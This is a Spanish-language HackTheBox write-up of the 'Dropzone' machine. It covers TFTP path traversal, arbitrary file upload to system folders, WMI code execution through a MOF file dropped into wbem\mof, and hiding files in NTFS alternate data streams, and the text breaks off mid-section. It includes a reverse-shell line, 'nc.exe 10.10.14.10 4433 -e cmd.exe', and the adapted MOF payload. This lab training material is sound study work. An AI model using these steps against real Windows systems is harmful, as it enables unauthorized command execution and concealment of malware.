---
layout      : post
title       : "HackTheBox - Dropzone"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139banner.png
category    : [ htb ]
tags        : [ ADS, TFTP, MOF, WMI ]
---
Máquina **Windows** nivel difícil, bastante bastante entretenida, jugaremos con un servicio **TFTP** para escribir archivos arbitrariamente en el sistema (sin restricción), usaremos esa habilidad para jugar con objetos **.mof** y el servicio **WMI**, consiguiendo así pasar de una simple subida de archivos a una "simple" ejecución remota de comandos en el sistema (: Finalmente debemos encontrar contenido oculto en archivos, esto mediante el feature **ADS** en Windows.

![139dropzoneHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139dropzoneHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [eks](https://www.hackthebox.eu/profile/302) & [rjesh](https://www.hackthebox.eu/profile/39054).

A quemaaaaaaaaaaaaaaaaaaaaaaaaaaarlo todoooooooooooooooooooooOO!!

Listoooooones, nos encontraremos con un único puerto **UDP**, es un servicio **TFTP** llamado **SolarWinds Free tftpd**. Jugando con él conseguiremos tanto descargar como subir archivos al servidor, pero lo curioso es que el "servidor" es el propio sistema, por lo que estaremos moviéndonos entre archivos del propio sistema (: 

Nos daremos cuenta de que podemos (de nuevo :P) tanto descargar como subir archivos en directorios donde no deberíamos poder, por lo que entendemos que o somos administradores directamente o estamos con un usuario que tiene permisos administrativos ;)

Teniendo en cuenta esto, encontraremos la forma de ejecutar comandos remotamente aprovechándonos de la subida de archivos. Jugando con el servicio **WMI** y un objeto `.mof` le indicaremos que al ser compilado nos ejecute alguna instrucción (llegaremos a obtener una **Reverse Shell** con ayuda de `nc.exe`, todo esto definido dentro del propio archivo `.mof`). **(Ahondaremos en esto en su momento)**.

Estando dentro de la máquina tendremos que jugar con el feature de **NTFS** llamado **ADS o Alternative Data Stream** el cual sirve como método para ocultar archivos dentro de otros archivos o directorios. Con esta premisa jugaremos con dos objetos interesantes, así encontraremos ocultas las flags tanto de `user.txt` como de `root.txt` en uno de ellos (:

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Vulnerabilidades comunes o que tienen bastaaaaante información pero más o menos realista :(

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

Iremos volando entre montañas, surfeando en sus ojos llenos de lágrimas... ⛲

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Movimiento lateral ADS -> flags](#movimiento-lateral-ads).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Empezaremos como siempre :P Enumeremos que puertos estás abiertos en la máquina:

```bash
❱ nmap -p- --open -v 10.10.10.90
...
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
...
```

Entonces agregamos el parámetro `-Pn`:

```bash
❱ nmap -p- --open -v -Pn 10.10.10.90 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -Pn       | Evita realizar Host Discovery, tal como el ping (P) y el DNS (n) |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Pero el escaneo va muy lento, así que agreguémosle el parámetro `--min-rate`, así aprovechamos para indicarle cuál es el mínimo de paquetes que queremos que envíe en cada petición, le diremos que sean **3000**:

```bash
❱ nmap -p- --open -v --min-rate=3000 -Pn 10.10.10.90 -oG initScan
```

Pero como resultado vemos que no tenemos ningún puerto TCP abierto... Despues de jugar con algunos [parámetros de **nmap**](https://www.cbtnuggets.com/blog/certifications/security/7-absolutely-essential-nmap-commands-for-pen-testing), intentamos hacer un escaneo, pero de servicios [UDP](https://es.wikipedia.org/wiki/Protocolo_de_datagramas_de_usuario) (con `-sU`), con este encontramos algo:

```bash
❱ nmap -sU -p- --open -v --min-rate=3000 -Pn 10.10.10.90 -oG initScan
```

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Wed May 19 25:25:25 2021 as: nmap -sU -p- --open -v --min-rate=3000 -Pn -oG initScan 10.10.10.90
# Ports scanned: TCP(0;) UDP(65535;1-65535) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.90 ()    Status: Up
Host: 10.10.10.90 ()    Ports: 69/open/udp//tftp/// Ignored State: open|filtered (65534)
# Nmap done at Wed May 19 25:25:25 2021 -- 1 IP address (1 host up) scanned in 51.63 seconds
```

Y obtenemos:

| Puerto | Descripción |
| ------ | :---------- |
| 69/udp | Al parecer el servicio **[TFTP](https://es.wikipedia.org/wiki/TFTP)** |

Ahora hagamos un escaneo de scripts y versiones, esto nos dará mucha más información (a veces :P) del servicio en cuestión...

Si intentamos como normalmente lo hacemos, o sea contra un puerto TCP, nos indica:

```bash
❱ nmap -p69 -sC -sV -Pn 10.10.10.90 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Obtenemos:

```bash
❱ cat portScan
...
PORT   STATE    SERVICE VERSION
69/tcp filtered tftp
...
```

Y ahora indicándole que es un escaneo de puertos **UDP**:

```bash
❱ nmap -sU -p69 -sC -sV -Pn 10.10.10.90 -oN portScan
```

```bash
❱ cat portScan
...
PORT   STATE SERVICE VERSION
69/udp open  tftp    SolarWinds Free tftpd
...
```

Bien, encontramos:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 69/udp | TFTP     | SolarWinds Free tftpd |

Bueno, pues veamos de que se trata y como explotarlo (:

...

### Puerto 69/UDP [⌖](#puerto-69) {#puerto-69}

> **TFTP** es un servidor para tranferir archivos de máquina remota a host y de host a máquina remota. No necesitamos estar autenticados y esta sirviendo sobre el protocolo **UDP**.

En nuestro caso tenemos un servicio en específico: [SolarWinds Free](https://www.solarwinds.com/es/free-tools/free-tftp-server), que nos ayuda con el tema de la transferencia de archivos de forma "segura"...

Investigando sobre ese software, encontramos cositas interesantes relacionadas con exploits y vulnerabilidades reportadas:

* [CVE-2006-1951 - Directory Path Traversal](https://www.cvedetails.com/cve/CVE-2006-1951/).
* [PoC Path Traversal **TFTP**](https://www.exploit-database.net/?id=73679).
* [**Este no es exclusivo del CVE, pero muestra mucho mejor el Path Traversal en otro software TFTP**](https://www.exploit-db.com/exploits/18718).

Entonces, vemos que existe una vulnerabilidad de [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal), la cual nos permite interactuar con archivos del sistema o servidor a los cuales no deberíamos tener acceso.

Empleando la herramienta [tftp](https://www.ibm.com/docs/de/aix/7.2?topic=transfers-file-using-tftp-utftp-commands) podemos jugar con el servidor para transferir archivos, también usaremos **rlwrap** para poder movernos entre comandos y tener histórico de lo que hemos hecho.

(Antes, agreguemos el dominio **dropzone.htb** (no lo hemos visto en ningún lado, pero es el que tiene más sentido) al archivo [/etc/hosts](https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html) contra la IP de la máquina, por si algo).

```bash
❱ rlwrap tftp dropzone.htb 69
tftp> status
Connected to dropzone.htb.
Mode: netascii Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> 
```

Validamos que estamos conectados :) Ahora intentemos [subir](https://www.ibm.com/docs/de/aix/7.2?topic=commands-copying-file-remote-host) un archivo:

```bash
❱ echo "si si como no, claro que si" > hola.txt
```

```bash
tftp> put hola.txt
Sent 29 bytes in 0.2 seconds
tftp>
```

Podemos subir archivos... Intentemos [descargarlo con otro nombre](https://www.ibm.com/docs/de/aix/7.2?topic=commands-copying-file-from-remote-host):

```bash
tftp> get hola.txt chao.txt
Received 29 bytes in 0.1 seconds
tftp>
```

```bash
❱ cat chao.txt 
si si como no, claro que si
```

Bien, así que también podemos descargar archivos... Dando saltos encontramos la ruta en la que estamos:

```bash
tftp> get siclaro.txt
Error code 1: Could not find file 'C:\siclaro.txt'.
tftp> 
```

Estamos en la raíz del sistema al parecer, pero no sabemos que archivos hallan ni como movernos para llegar a probar el **Path Traversal**, así, que, a, JUGAR!

...

## Explotación [#](#explotacion) {#explotacion}

Explorando algunos exploits (poc) y moviéndonos con ellos (aún sin saber que archivos puedan existir, pero probando algunos que están por default en los sistemas **Windows** o que son [importantes en él](http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf)), logramos finalmente encontrar la forma de movernos entre archivos y de descargarlos:

```bash
tftp> get /Windows/System32/Ntdll.dll
Received 706048 bytes in 146.0 seconds
tftp>
```

```bash
❱ file Ntdll.dll 
Ntdll.dll: MS-DOS executable
```

En nuestro caso descargamos el archivo **Ntdll.dll** (que podría haber sido cualquier otro, esto es más de prueba), que da soporte interno a distintas funciones del sistema. Así que:

1. Sabemos el formato para movernos entre archivos del sistema: `get /<path>` o `put <file> /<path>`.
2. Aparentemente podemos interactuar con archivos del sistema, o sea que tenemos privilegios para hacerlo, confirmémoslo jugando con [archivos sensibles en **Windows**](https://hakluke.medium.com/sensitive-files-to-grab-in-windows-4b8f0a655f40).

No podemos interactuar directamente con los objetos **SAM** y **SYSTEM**, ya que el sistema los está usando actualmente. Intentando descargar de la carpeta `C:\Windows\repair`, el backup del registro **SAM** como del registro **SYSTEM**, y jugando con la herramienta [samdump2](https://superuser.com/questions/364290/how-to-dump-the-windows-sam-file-while-the-system-is-running/1088644) para dumpear las credenciales guardadas, no logramos nada :( 

**Peeeeeeeero**, podemos corroborar que tenemos algún tipo de privilegio al subir archivos a sitios "peligrosos" y con habitual restricción:

```bash
tftp> put hola.txt /Windows/repair/holiwis.txt
Sent 29 bytes in 0.2 seconds
tftp> put hola.txt /Windows/System32/holiwis.txt
Sent 29 bytes in 0.2 seconds
tftp> put hola.txt /Windows/System32/config/holiwis.txt
Sent 29 bytes in 0.2 seconds
tftp> 
```

Perfecto, podemos subir archivos en sitios donde no deberíamos si no tuviéramos privilegios.

Bien, perooooo, como podemos aprovechar subir archivos para ejecutar comandos... Llega la parte de búsqueda y captura 😎

...

Siguiendo la lista de [archivos interesantes en los sistemas **Windows**](http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf), vemos uno llamado **Boot.ini**, el cual contiene información de la versión del sistema en el que estamos, echémosle un ojo:

```bash
tftp> get /Boot.ini
Received 211 bytes in 0.1 seconds
tftp> 
```

```powershell
❱ cat Boot.ini 
[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
```

Vale, **Microsoft Windows XP Professional**, esto quizás nos sirva para acotar nuestra búsqueda (:

...

Despues de buscar y buscar, encontramos una vulnerabilidad locochona (es de otro servidor **FTP** llamado **Open-FTPD**), lo interesante está en su descripción:

![139google_openftpdESC](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_openftpdESC.png)

> [Arbitrary file upload - OpenFTPD 1.2](https://www.hackingarticles.in/exploit-windows-pc-using-open-ftpd-1-2-arbitrary-file-upload/).

Indica que la vulnerabilidad permite escribir cualquier tipo de archivo en cualquier directorio (esto ya lo sabíamos), peeeero que es posible conseguir ejecución remota de comandos mediante un archivo `.mof`, él habilitara el servicio **WMI (Management Instrumentation service)** para que ejecute un archivo `.exe` (que sería nuestro payload) 😲

Pufff pues es lo que necesitamos, pero claro, está relacionado con otro software :( y está creado para ser ejecutado con **metasploit**...

Antes de seguir exploremos que es un archivo `.mof` y su interacción con el servicio **WMI**, así nos queda más claro lo que queremos hacer y como es que funciona.

Caí en un **Rabbit Hole**, pero encontré un lindo recurso que no quería perder:

* [Intro to file operation abuse on **Windows**](https://offsec.almond.consulting/intro-to-file-operation-abuse-on-Windows.html).

...

#### Buceando entre archivos .mof y el servicio WMI

...

##### WMI (Windows Management Instrumentation)

Hablemos primero del servicio **WMI**:

> **Windows Management Instrumentation (WMI)** es una implemtación del conjutno de tecnologias **WBEM (Web-Based Enterprise Management)** que habilita a los adminsitradores del sistema ejecutar tareas tanto local como remotamente.

Básicamente es eso, pero si pensamos como atacantes puede ser muy peligroso, ¿no?

Acá una descripción gráfica de la arquitectura con la que cuenta **WMI**: (Vemos algunos servicios con los que hemos interactuado en otras máquinas, como por ejemplo **WinRM** (evil-winrm))

![139google_wmi_architecture](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_wmi_architecture.png)

> Tomada de: [hackplayers.com/ataques_wmi](https://www.hackplayers.com/2021/03/entendiendo-los-ataques-con-wmi.html).

El poder que toma **WMI** como atacantes llega cuando pensamos en **persistencia**, tener acceso ilimitado a un sistema por ejemplo, o ejecutar X tarea en cualquier momento sin preocuparnos de nada. **Acá** entran en juego los archivos `.mof` y una característica necesaria en cada uno de ellos:

* Requieren el uso de **3** clases, cada clase tiene su uso:
  1. **__EventFilter**: Almacenar el payload que queremos ejecutar. (Usa **WMI Query Languaje (WQL)** para detectar el evento
  2. **__EventConsumer**: El evento que hará ejecutar lo que tenemos en la clase **1**.
  3. **__FilterToConsumerBinding**: Relacionar las **2** clases anteriores (tanto el evento como la acción).

Algunos recursos para leer sobre **WMI** y las clases del archivo `.mof`:

* [Entendiendo los ataques con **WMI**](https://www.hackplayers.com/2021/03/entendiendo-los-ataques-con-wmi.html).
* [**WMI** Permanent Event Subscription - **MOF** files](http://www.fuzzysecurity.com/tutorials/19.html). Este recurso tiene muchas referencias guapas para profundizar como nunca en estos temas, a ojear ;)

Peero, los qué más destaque (y usé) fueron estos dos:

* [Playing with **MOF** files on **Windows**](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html).
* [Persistence **WMI** event subscription](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/).

Bien, como dije antes, estas tres clases están incluidas en un archivo `.mof` (Managed object format), pero, ¿qué es esto y como interactúa con **WMI**?

##### MOF (Managed object format)

[MOF](https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-) es el lenguaje que se usa para describir las clases de los **m**odelos de **i**nformación **c**omún, abreviados como **CIM**:

> Estándar abierto que define cómo los elementos administrados en un entorno de TI se representan como un conjunto común de objetos y relaciones entre ellos. [CIM](https://en.wikipedia.org/wiki/Common_Information_Model_(computing)).

Entonces, la interacción se logra gracias a las clases del archivo `.mof` que son interpretadas por el servicio **WMI** cuando el objeto `.mof` es compilado...

Acá encontramos que para la compilación del objeto a primera vista era necesario hacerlo manualmente, esto mediante el programa `Mofcomp.exe` alojado en el repositorio **WMI**, peeeeeeeeeeeeeeeeeeeeero apoyándonos en los recursos, vemos esto:

> a MOF file that is put in the `%SystemRoot%\System32\wbem\mof\` directory is automatically **compiled** and **registered** into the **WMI** repository.

Opa, así que solo necesitaríamos colocar nuestro objeto en esa ruta y no deberíamos preocuparnos por su compilación (:

Un ejemplo que nos da [poppopret](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html) es el muy conocido [Stuxnet](https://es.wikipedia.org/wiki/Stuxnet) que fue capaz de controlar y juguetear con sistemas industriales (SCADA) reprogramando tareas y creando otras, algunas de ellas usando el mismo tipo de ataque, ellos subieron:

> * `%SystemRoot%\System32\winsta.exe`: Stuxnet’s main module
> * `%SystemRoot%\System32\wbem\mof\sysnullevnt.mof`: MOF file that will automatically compile itself and that contains the code needed to execute the winsta.exe file when some events occur.

Linda vuln...

**En resumen**, el objeto `.mof` tiene clases, entre ellas generar "pasos" e "instrucciones" de las cuales nos podemos aprovechar, con las instrucciones dentro, solo necesitaríamos colocar ese objeto en la ruta anterior para que se autocompile y ejecute lo que queramos que ejecute :P

...

Pues listos, hemos ahondado en estos dos temas y tenemos claro la función y el porqué, sigamos jugando con la vulnerabilidad del **OpenFTPD 2.1**:

Investigando el exploit que usa (`exploit/windows/ftp/open_ftpd_wbem`) según el [PoC](https://www.hackingarticles.in/exploit-windows-pc-using-open-ftpd-1-2-arbitrary-file-upload/), encontramos el código fuente:

* [open_ftpd_wbem.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/ftp/open_ftpd_wbem.rb)

Leyendo el script, vemos el llamado a una función, `generate_mof()`: (que claramente es llamativa para nosotros, **porque si es genérica**, nos puede servir como base para el objeto `.mof`)

![139google_openftpdRB_funcMOF](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_openftpdRB_funcMOF.png)

Donde toma como argumentos, el nombre que le queremos poner al archivo `.mof` y el nombre del archivo `.exe`... Dando clic sobre la función, nos muestra:

> Defined in `lib/msf/core/exploit/wbem_exec.rb`.

Y si ahora damos clic sobre esa referencia llegamos a la fuente del archivo [wbem_exec.rb](https://github.com/rapid7/metasploit-framework/blob/882c2722af5e0cec988baeb5945c9066fec1e7ca/lib/msf/core/exploit/wbem_exec.rb#L17):

![139google_wbemEXECrb](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_wbemEXECrb.png)

Oko, dándole vueltas al archivo, vemos que el contenido del objeto `.mof` está dentro de la variable **mof** e indica su fin cuando encuentra la cadena *EOT*, entonces, tomemos tooodas esas líneas y copiémoslas a un archivo de nuestro sistema `.mof`.

```bash
❱ wc -l payload.mof 
62 payload.mof
```

Vemos varias partes donde toma valores de variables, modifiquemos esas partes para alojar **nuestros** valores:

<span style="color: red">**@EXE@**</span>: que es donde va el nombre del archivo `.exe`, cambiémoslo por `nc.exe`:

![139bash_sed_EXE_2_ncEXE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139bash_sed_EXE_2_ncEXE.png)

En la instrucción número **1**, buscamos la cadena **@EXE@** en el payload, es la número **2** buscamos la cadena **nc.exe**, como no hay match nos responde con error y en la número **3** jugamos con [sed](https://www.ochobitshacenunbyte.com/2019/05/28/uso-del-comando-sed-en-linux-y-unix-con-ejemplos/) para jugar con el contenido del archivo, donde yo creo que la mayoría se entiende y la duda puede estar en la `g`, ella le indica a **sed** que haga el remplazo en todos los matchs que encuentre.

**Para decirle que haga el cambio permanente, le tenemos que indicar el parámetro `-i` a** sed **(:**

Ahora en esta instancia, `Instance of ActiveScriptEventConsumer as $cons`, modificamos la línea donde esta `nc.exe` para que nos haga una petición a nuestra máquina:

```mof
...
ScriptText = ...ns.Run(\\"nc.exe 10.10.14.10 4433\\");} catch...
...
```

:)

<span style="color: red">**#{mofname}**</span>: acá va el nombre del objeto `.mof`:

```bash
❱ sed -i 's/#{mofname}/payload.mof/g' payload.mof
```

<span style="color: red">**@CLASS@**</span>: que al parecer toma el valor de la clase, pongamos cualquiera:

```bash
❱ sed 's/@CLASS@/eAcabo/g' payload.mof | grep -n eAcabo
2:class MyClasseAcabo
29:  ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"nc.exe\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClasseAcabo\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";
40:  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClasseAcabo\\"";
59:instance of MyClasseAcabo as $MyClass
```

```bash
❱ sed -i 's/@CLASS@/eAcabo/g' payload.mof
```

Listos, no vemos más referencias extrañas...

Lo que hará el objeto al ser compilado será:

1. Ejecutará nuestro payload (`nc.exe`) para que haga una petición hacia nuestro listener.
2. Borrará los dos archivos, tanto el objeto `.mof` como el binario `nc.exe` del sistema.

Procedamos a subir los archivos y ver si obtenemos alguna petición:

```bash
❱ nc -lvp 4433
listening on [any] 4433 ...
```

Y en el servidor **TFTP** subimos los objetos:

(Recordemos las rutas donde debemos subirlos: **exe**, `c:\Windows\System32` y **mof**, `c:\Windows\System32\wbem\mof`).

```bash
❱ rlwrap tftp dropzone.htb 69
tftp> binary
tftp> put nc.exe /Windows/System32/nc.exe
Sent 38866 bytes in 8.3 seconds
tftp> put payload.mof /Windows/System32/wbem/mof/payload.mof
Sent 2349 bytes in 0.7 seconds
tftp> 
```

Pero no recibimos nada 😝

Comparando nuestro `.mof` con los ejemplos que vimos antes, encontramos una diferencia relacionada con los **escapes** de caracteres.

Ejemplo de la web:

```mof
#pragma namespace ("\\\\.\\root\\subscription")
```

El nuestro:

```mof
#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
```

Vale, pues en todo el archivo hay varios "escapes" de ese estilo, así que juguemos de nuevo con **sed** para indicarle que si encuentra 4 `\` los remplace por 2 `\`:

```bash
❱ head payload.mof -n 1
#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
```

```bash
❱ sed 's/\\\\/\\/g' payload.mof | head -n 1
#pragma namespace("\\\\.\\root\\cimv2")
```

Listo, hagámoslo permanente:

```bash
❱ sed -i 's/\\\\/\\/g' payload.mof
```

Ahora, volvamos a intentar a ver si ese era el problema:

```bash
tftp> binary
tftp> put nc.exe /Windows/System32/nc.exe
Sent 38616 bytes in 8.3 seconds
tftp> put payload.mof /Windows/System32/wbem/mof/payload.mof
Sent 2218 bytes in 0.7 seconds
tftp> 
```

Y en nuestro listener:

```bash
❱ nc -lvp 4433
listening on [any] 4433 ...
connect to [10.10.14.10] from dropzone.htb [10.10.10.90] 1066
```

TENEMOS RESPUESTAAAAAAAAAAAAAAAAAAaaaAAaasdfasdflkjasdgklñ!!

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_gif_muppetDance.gif" style="display: block; margin-left: auto; margin-right: auto; width: 40%;"/>

Listoooooooooooo, podríamos generar un payload con `msfvenom` que al ejecutarse nos lanzara una **Reverse Shell**, pero probando con el mismo `nc.exe` podemos indicarle la instrucción de siempre:

```mof
...
ScriptText = ...ns.Run(\"nc.exe 10.10.14.10 4433 -e cmd.exe\");} catch...
...
```

Con eso le indicamos que una vez se obtenga la petición en nuestro servidor (listener) nos lance una `cmd.exe`, o sea, una terminal (:

Subimos los binarios y en nuestro listeneeeeeer:

![139bash_administrator_revSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139bash_administrator_revSH.png)

Perfectisimoooooooooooooooooooooooo, no tenemos habilitado el comando **whoami** ni `echo %username` para ver con que usuario estamos, pero, si logramos escribir en esas rutas tenemos constancia que somos administradores del sistema :P

Veamos las flags:

```powershell
C:\>dir

 Volume in drive C has no label.
 Volume Serial Number is 7CF6-55F6

 Directory of C:\

09/05/2018  10:39     <DIR>          114de795ed2964dbe35a
09/05/2018  05:22                  0 AUTOEXEC.BAT
09/05/2018  05:22                  0 CONFIG.SYS
09/05/2018  08:50     <DIR>          Documents and Settings
09/05/2018  10:41     <DIR>          Program Files
10/05/2018  02:49     <DIR>          WINDOWS
               2 File(s)              0 bytes
               4 Dir(s)   7.634.173.952 bytes free

C:\>
```

```powershell
C:\>cd "Documents and Settings"
C:\Documents and Settings>dir

 Volume in drive C has no label.
 Volume Serial Number is 7CF6-55F6

 Directory of C:\Documents and Settings

09/05/2018  08:50     <DIR>          .
09/05/2018  08:50     <DIR>          ..
09/05/2018  10:20     <DIR>          Administrator
09/05/2018  05:21     <DIR>          All Users
               0 File(s)              0 bytes
               4 Dir(s)   7.634.165.760 bytes free

C:\Documents and Settings>
```

Solo hay un usuario, en su directorio **Desktop** vemos:

```powershell
C:\Documents and Settings\Administrator\Desktop>dir

 Volume in drive C has no label.
 Volume Serial Number is 7CF6-55F6

 Directory of C:\Documents and Settings\Administrator\Desktop

02/03/2021  07:59     <DIR>          .
02/03/2021  07:59     <DIR>          ..
10/05/2018  10:10     <DIR>          flags
10/05/2018  10:12                 31 root.txt
               1 File(s)             31 bytes
               3 Dir(s)   7.634.161.664 bytes free

C:\Documents and Settings\Administrator\Desktop>
```

Si visualizamos la flag, tenemos:

```powershell
C:\Documents and Settings\Administrator\Desktop>type root.txt
It's easy, but not THAT easy...
C:\Documents and Settings\Administrator\Desktop>
```

Jmmm... Dentro de la carpeta llamada **flags** tenemos:

```powershell
C:\Documents and Settings\Administrator\Desktop\flags>dir

 Volume in drive C has no label.
 Volume Serial Number is 7CF6-55F6

 Directory of C:\Documents and Settings\Administrator\Desktop\flags

10/05/2018  10:10     <DIR>          .
10/05/2018  10:10     <DIR>          ..
10/05/2018  10:09                 76 2 for the price of 1!.txt
               1 File(s)             76 bytes
               2 Dir(s)   7.634.149.376 bytes free

C:\Documents and Settings\Administrator\Desktop\flags>
```

Y en el archivo:

```powershell
C:\Documents and Settings\Administrator\Desktop\flags>type "2 for the price of 1!.txt"
For limited time only!

Keep an eye on our ADS for new offers & discounts!
C:\Documents and Settings\Administrator\Desktop\flags>
```

:o

...

## Movimiento lateral : ADS -> flags [#](#movimiento-lateral-ads) {#movimiento-lateral-ads}

Buscando por **ads** (alguna carpeta con referencia a promociones o algún programa que se relacionara) en el sistema, no encontré nada :) 

Con una simple petición en la web con: "**ads windows**", encontramos algo llamado ***Flujos de datos alternativos*** (en ingles ***Alternate Data Stream - ADS***), veamos si lo podemos relacionar con la máquina.

#### ADS - ¿khe ez eztho?

Es una característica de los ficheros **NTFS** (New Techonology File System: sistema de archivos que permite organizar datos en discos duros y otros medios de almacenamiento) que **habilita el guardar archivos "ocultos" dentro de otros archivos o carpetas** en el sistema. [ADS en Windows](http://www.christiandve.com/2017/06/flujos-alternativos-datos-alternate-data-streams-windows-ads/).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139google_gif_fascinating.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

Y si, interesante, pueda que debamos buscar algún **ADS** en los propios archivos que hacen referencia a las flags, (tiene toda la pinta de ser por ahí).

* [Lindo post en español para entender los flujos de datos alternativos (**ADS**)](http://www.christiandve.com/2017/06/flujos-alternativos-datos-alternate-data-streams-windows-ads/).

Primero veamos como funciona para despues encontrar formas de ver **ADS**'s en archivos...

> **Alternate Data Streams** are simple to create and entail little or no skill to use. Common DOS commands such as `type` can be used to create **Alternate Data Streams (ADS)**. These commands are used in conjunction with a redirect [`>`] and colon [`:`] to **fork** one file **into** another. [Alternate Data Stream](https://www.sciencedirect.com/topics/computer-science/alternate-data-stream).

El anterior recurso nos da un ejemplo sencillo:

```powershell
type c:\malicious.exe > c:\winnt\system32\calc.exe:malicious.exe
```

Ahondemos en algo muuucho más sencillo, así nos queda claro el funcionamiento, poder leer el ejemplo anterior y entenderlo mejor...

##### Creamos ADS en archivo random

**Creamos objeto**:

```powershell
C:\totest>echo "hola como estoy" > hola.txt
C:\totest>type hola.txt
"hola como estoy"
```

Bien, todo normal, ahoraaaaaa

##### Agregamos ADS en archivo hola.txt

Guardemos otra cadena en el archivo `hola.txt`, con la ayuda de la herramienta **type** en *Windows* lograremos agregar el **ADS** al objeto:

```powershell
C:\totest>echo "pero claro que si" > claro.txt
C:\totest>dir

 Volume in drive C has no label.
 Volume Serial Number is 7CF6-55F6

 Directory of C:\totest

31/05/2021  11:15     <DIR>          .
31/05/2021  11:15     <DIR>          ..
31/05/2021  11:15                 22 claro.txt
31/05/2021  11:15                 20 hola.txt
               2 File(s)             42 bytes
               2 Dir(s)   7.633.752.064 bytes free

C:\totest>type claro.txt > hola.txt:claro.txt
```

Ahora vemos su contenido

##### Validando la inserción del contenido oculto dentro del archivo hola.txt

Jugamos con **more**:

```powershell
C:\totest>more < hola.txt
"hola como estoy" 
C:\totest>
```

```powershell
C:\totest>more < hola.txt:claro.txt
"pero claro que si"
C:\totest>
```

Perfecto, ya tenemos oculto dentro del archivo `hola.txt` el contenido del objeto `claro.txt` (:

Para el caso de querer ocultar un objeto ejecutable (por ejemplo `calc.exe`) en otro archivo, hacemos los mismos pasos solo que si queremos ejecutar el **ADS** (`.exe` incrustado) lo llamamos así:

```powershell
C:\totest>type c:\windows\system32\calc.exe > hola.txt:calc.exe
C:\totest>start c:\totest\hola.txt:calc.exe
```

Y ejecutaría la calculadora :P

> Tomado de: [**ADS** - The good and the bad](https://blog.foldersecurityviewer.com/ntfs-alternate-data-streams-the-good-and-the-bad/).

...

Otro ejemplo sin necesidad de crear un archivo:

```powershell
C:\totest>echo "nop, asi no" > claro.txt:nop.txt
```

```powershell
C:\totest>more < claro.txt
"pero claro que si"
C:\totest>more < claro.txt:nop.txt
"nop, asi no" 
```

Y bueno hay muchos ejemplos, se vuelve superinteresante cuando piensas todo lo que puedes llegar a hacer con esto...

...

##### Validamos existencia de ADS en archivos

Pero listo, ahora la duda: ¿Cómo sé si algún archivo tiene un **ADS** dentro? Pues bien, en [esta introducción a los **ADS**](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/) responden esta pregunta con un software llamado `streams.exe`. Dando algunas vueltas para encontrar el binario, no solo encontramos **ese**, si no varios más.

* [Respuesta en foro sobre maneras de identificar archivos ocultos con **ADS**](https://security.stackexchange.com/questions/34168/how-can-i-identify-discover-files-hidden-with-ads).

Y [acá](https://api.256file.com/streams64.exe/en-download-190154.html) tenemos un comprimido con muuuuchos binarios que nos ayudaran con esa tarea (el que usaremos será `streams.exe`):

* [Si das clic te descargará el comprimido de una vez](http://download.sysinternals.com/files/SysinternalsSuite.zip).

